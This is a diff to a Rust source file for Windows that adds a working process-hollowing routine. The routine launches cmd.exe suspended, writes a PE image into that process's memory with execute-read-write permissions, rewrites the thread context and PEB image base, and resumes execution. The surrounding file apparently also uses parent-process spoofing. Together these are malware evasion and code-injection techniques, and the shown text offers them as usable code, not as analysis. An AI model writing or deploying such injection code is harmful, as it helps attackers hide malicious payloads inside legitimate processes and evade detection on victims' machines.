@@ -1,22 +1,117 @@
-use std::{mem::size_of, os::raw::c_void};
+use std::{fs, mem::size_of, os::raw::c_void};
 use windows::{
-    core::{PCSTR, PSTR, PWSTR},
+    core::{s, PCSTR, PSTR, PWSTR},
     Wdk::System::Threading::{NtQueryInformationProcess, PROCESSINFOCLASS},
     Win32::{
-        Foundation::{self, CloseHandle, HANDLE},
+        Foundation::{self, CloseHandle, HANDLE, HMODULE},
         System::{
-            Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory},
-            Threading::{
+            Diagnostics::Debug::{
+                GetThreadContext, ReadProcessMemory, SetThreadContext, WriteProcessMemory, CONTEXT, CONTEXT_FULL_AMD64, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER
+            }, LibraryLoader::GetModuleFileNameA, Memory::{VirtualAllocEx, PAGE_EXECUTE_READWRITE, VIRTUAL_ALLOCATION_TYPE}, SystemServices::IMAGE_DOS_HEADER, Threading::{
                 CreateProcessA, DeleteProcThreadAttributeList, InitializeProcThreadAttributeList,
                 OpenProcess, ResumeThread, UpdateProcThreadAttribute, EXTENDED_STARTUPINFO_PRESENT,
                 LPPROC_THREAD_ATTRIBUTE_LIST, PEB, PROCESS_BASIC_INFORMATION,
                 PROCESS_CREATE_PROCESS, PROCESS_CREATION_FLAGS, PROCESS_INFORMATION,
                 PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                 RTL_USER_PROCESS_PARAMETERS, STARTUPINFOA, STARTUPINFOEXA,
-            },
+            }
         },
     },
 };
+
+pub fn get_current_filename() -> String {
+    let mut buffer: [u8; 260] = [0; 260]; // MAX_PATH is typically 260
+    let length = unsafe { GetModuleFileNameA(HMODULE::default(), &mut buffer) };
+
+    String::from_utf8(buffer[..length as usize].to_vec()).expect("Failed to convert buffer to String")
+}
+
+// This currently works only for x64. For x86 registers and offsets need to be adjusted.
+pub fn process_hollowing(filename: String) {
+    let contents = fs::read(filename.clone()).expect("Could not read file");
+    
+
+    let dos_header = contents.as_ptr() as *const IMAGE_DOS_HEADER;
+    let nt_headers = unsafe {
+        (contents.as_ptr().add((*dos_header).e_lfanew as usize)) as *const IMAGE_NT_HEADERS64
+    };
+    let section_header = ((nt_headers as usize) + size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;
+
+    let mut startup_info = STARTUPINFOA::default();
+    startup_info.cb = size_of::<STARTUPINFOA>() as u32;
+    let mut process_info = PROCESS_INFORMATION::default();
+
+    let _ = unsafe {
+        CreateProcessA(
+            s!("C:\\Windows\\system32\\cmd.exe\0"),
+            PSTR::null(),
+            None,
+            None,
+            false,
+            PROCESS_CREATION_FLAGS(0x00000004), //CREATE_SUSPENDED
+            None,
+            None,
+            &startup_info,
+            &mut process_info,
+        )
+        .expect("Could not create process")
+    };
+
+    // this pattern is used instead of VirtualAlloc
+    let mut ctx_box: Box<[u8]> = vec![0; size_of::<CONTEXT>()].into_boxed_slice();
+    let ctx = ctx_box.as_mut_ptr() as *mut _ as *mut CONTEXT;
+    unsafe { (*ctx ).ContextFlags = CONTEXT_FULL_AMD64;}
+
+    unsafe {
+        GetThreadContext(process_info.hThread, ctx).expect("Could not get thread context");
+    }
+
+
+    let image_base = unsafe {
+        VirtualAllocEx(
+            process_info.hProcess,
+            Some((*nt_headers).OptionalHeader.ImageBase as *const c_void),
+            (*nt_headers).OptionalHeader.SizeOfImage as usize,
+            VIRTUAL_ALLOCATION_TYPE(0x3000),
+            PAGE_EXECUTE_READWRITE,
+        )
+    };
+
+    unsafe {
+        WriteProcessMemory(
+            process_info.hProcess,
+            image_base as *const c_void,
+            contents.as_ptr() as *const c_void,
+            (*nt_headers).OptionalHeader.SizeOfHeaders as usize,
+            None,
+        ).expect("Could not write to process memory");
+
+        for i in 0..(*nt_headers).FileHeader.NumberOfSections {
+            let curr_section_header = *(section_header.add(i as usize));
+            WriteProcessMemory(
+                process_info.hProcess,
+                image_base.add(curr_section_header.VirtualAddress as usize),
+                contents.as_ptr().add(curr_section_header.PointerToRawData as usize) as *const c_void,
+                curr_section_header.SizeOfRawData as usize,
+                None,
+            ).expect("Could not write to process memory");
+        }
+        
+        WriteProcessMemory(
+            process_info.hProcess,
+            ((*ctx).Rdx + 0x10 as u64) as *const c_void,
+            &image_base as *const _ as *const c_void,
+            size_of::<*const c_void>() as usize,
+            None,
+        ).expect("Could not write to image base");
+
+        (*ctx).Rcx = image_base.add((*nt_headers).OptionalHeader.AddressOfEntryPoint as usize) as u64;
+        SetThreadContext(process_info.hThread, ctx).expect("Could not set thread context");
+        ResumeThread(process_info.hThread);
+    
+    }
+
+}
 
 pub fn apply_process_mitigation_policy() {
     let mut startup_info = STARTUPINFOEXA::default();
